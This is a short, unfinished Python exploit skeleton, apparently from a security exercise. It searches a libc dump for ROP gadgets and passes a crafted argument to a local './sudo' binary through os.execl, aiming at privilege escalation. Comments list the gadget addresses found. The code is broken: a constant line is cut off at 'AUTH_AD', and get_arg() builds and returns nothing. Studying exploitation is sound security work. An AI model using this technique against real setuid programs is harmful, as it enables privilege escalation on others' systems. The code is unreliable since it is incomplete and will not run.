import os, sys
import assemble
from search import GadgetSearch

LIBC_SA = 0xb7d672c0
AUTH_AD
PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_arg():
    s = GadgetSearch(LIBC_DUMP_PATH, LIBC_SA)
    pop_gadget = s.find('pop ecx; pop eax')
    mov_gadget = s.find('mov [eax], ecx')



def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
#[['mov [eax],ecx', '0xb7d925ab'], ['mov [eax],ecx', '0xb7d92843'],
# ['mov [eax],ecx', '0xb7d92b9a'], ['mov [eax],edx', '0xb7dd7eb0'],
# ['mov [eax],edx', '0xb7e866bb']]

#[['pop ecx; pop eax', '0xb7e512dc'], ['pop ecx; pop eax', '0xb7e512fd'], 
# ['pop ecx; pop edx', '0xb7d92db8']]

